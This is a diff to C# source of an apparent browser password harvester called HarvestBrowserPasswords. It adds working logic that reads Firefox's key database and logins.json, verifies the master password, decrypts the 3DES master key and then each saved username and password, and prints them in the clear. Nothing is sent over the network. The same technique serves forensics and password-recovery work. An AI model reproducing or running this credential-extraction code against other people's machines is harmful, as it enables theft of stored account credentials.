@@ -22,6 +22,9 @@ namespace HarvestBrowserPasswords
         public string MasterPassword            { get; set; }
         public byte[] DecryptedPasswordCheck    { get; set; }
         public byte[] Decrypted3DESKey          { get; set; }
+        public byte[] EntrySaltLoginData        { get; set; }
+        public byte[] CipherTextLoginData       { get; set; }
+        public byte[] DecryptedLoginData        { get; set; }
 
         public FirefoxDatabaseDecryptor(string profile)
         {
@@ -38,14 +41,49 @@ namespace HarvestBrowserPasswords
                 FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);
 
                 //Decrypt password-check value to ensure correct decryption
-                DecryptedPasswordCheck = Decrypt3DES(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);
+                DecryptedPasswordCheck = Decrypt3DESMasterKey(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);
 
                 if (PasswordCheck(DecryptedPasswordCheck))
-                {   
-                    //Decrypt master key
-                    Decrypted3DESKey = Decrypt3DES(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
-                }
+                {
+                    //Decrypt master key (this becomes padded EDE key for username / password decryption)
+                    //Master key should have 8 bytes of PKCS#7 Padding
+                    Decrypted3DESKey = Decrypt3DESMasterKey(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);
 
+                    //Check for and remove padding
+                    Decrypted3DESKey = Unpad(Decrypted3DESKey);
+
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
+                    {
+                        byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
+                        byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);
+                        Console.WriteLine($"URL                     {login.FormSubmitURL}");
+                        Console.WriteLine($"Encrypted Username      {BitConverter.ToString(usernameBytes)}");
+                        Console.WriteLine($"Encrypted Password      {BitConverter.ToString(passwordBytes)}");
+
+
+                        //TODO: Reimplement ASN.1 Parser more generically - need to be able to extract entry salt and ciphertext from ASN.1 encoded login data - 
+                        //ASN1Parser usernameParser = new ASN1Parser(usernameBytes);
+                        ASN1 usernameASN1 = new ASN1(usernameBytes);
+
+                        byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
+                        byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
+
+                        //Extract password ciphertext from logins.json
+                        ASN1 passwordASN1 = new ASN1(passwordBytes);
+
+                        byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
+                        byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
+
+                        string usernameDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
+                        string passwordDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
+
+                        Console.WriteLine($"Decrypted Username      {usernameDecrypted}");
+                        Console.WriteLine($"Decrypted Password      {passwordDecrypted}");
+                        //Remove this
+                        break;
+                    }
+                }
             }
         }
 
@@ -80,33 +118,31 @@ namespace HarvestBrowserPasswords
                 while (dataReader.Read())
                 {
                     GlobalSalt = (byte[])dataReader[0];
+
                     //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                     byte[] item2Bytes = (byte[])dataReader[1];
 
-                    ASN1Parser parser = new ASN1Parser(item2Bytes);
+                    ASN1 passwordCheckASN1 = new ASN1(item2Bytes);
 
-                    EntrySaltPasswordCheck = parser.EntrySalt;
-                    CipherTextPasswordCheck = parser.CipherText;
+                    EntrySaltPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
+                    CipherTextPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[1];
                 }
 
                 //Second, query the nssPrivate table for entry salt and encrypted 3DES key
                 SQLiteCommand commandNSSPrivateQuery = connection.CreateCommand();
-                commandNSSPrivateQuery.CommandText = "SELECT a11,a102 FROM nssPrivate";
+                commandNSSPrivateQuery.CommandText = "SELECT a11 FROM nssPrivate";
                 dataReader = commandNSSPrivateQuery.ExecuteReader();
 
-                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
+                //Parse the ASN.1 data from the nssPrivate table to extract entry salt and cipher text for encrypted 3DES master decryption key
                 while (dataReader.Read())
                 {
                     byte[] a11 = (byte[])dataReader[0];
-                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
-                    byte[] a102 = (byte[])dataReader[1]; // Probably don't need this???
 
-                    ASN1Parser parser = new ASN1Parser(a11);
+                    ASN1 masterKeyASN1 = new ASN1(a11);
 
-                    EntrySalt3DESKey = parser.EntrySalt;
-                    CipherText3DESKey = parser.CipherText;
+                    EntrySalt3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
+                    CipherText3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[1];
                 }
-
             }
             catch (Exception e)
             {
@@ -119,7 +155,7 @@ namespace HarvestBrowserPasswords
             }
         }
 
-        public static byte[] Decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
+        public static byte[] Decrypt3DESMasterKey(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
         {
             //https://github[.]com/lclevy/firepwd/blob/master/mozilla_pbe.pdf
 
@@ -223,8 +259,6 @@ namespace HarvestBrowserPasswords
                     ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
                     decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
                 }
-
-                //passwordCheck = Encoding.ASCII.GetString(result); 
             }
             catch (Exception e)
             {
@@ -232,6 +266,33 @@ namespace HarvestBrowserPasswords
                 decryptedResult = null;
             }
             Console.ResetColor();
+            return decryptedResult;
+        }
+
+        public static byte[] Decrypt3DESLogins(byte[] cipherText, byte[] iv, byte[] key)
+        {
+            byte[] decryptedResult = new byte[cipherText.Length];
+
+            try
+            {
+                using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
+                {
+                    Key = key,
+                    IV = iv,
+                    Mode = CipherMode.CBC,
+                    Padding = PaddingMode.None
+                })
+                {
+                    ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
+                    decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"Exception: {e}");
+                Console.ResetColor();
+            }
             return decryptedResult;
         }
 
@@ -257,6 +318,35 @@ namespace HarvestBrowserPasswords
                 return false;
             }
         }
-            
+
+        public byte[] Unpad(byte[] key)
+        {
+            bool paddingCheck = true;
+
+            //Check integer value of last byte of array 
+            int paddingValue = key[key.Length - 1];
+            byte[] unpadded = new byte[key.Length - paddingValue];
+
+            //Check last n bytes of key for equality where n = integer value of last byte
+            for (int i = 1; i < (paddingValue + 1); i++)
+            {
+                if (!(key[key.Length - i] == paddingValue))
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"[-] Unpad() Error: Incorrect or Nil padding applied to byte array:\n{BitConverter.ToString(key)}");
+                    Console.ResetColor();
+                    //Throw exception here
+                    paddingCheck = false;
+                }
+            }
+
+            if (paddingCheck)
+            {
+                //Create new bytearray with trailing padding bytes removed
+                Buffer.BlockCopy(key, 0, unpadded, 0, unpadded.Length);
+            }
+
+            return unpadded;
+        }
     }
 }
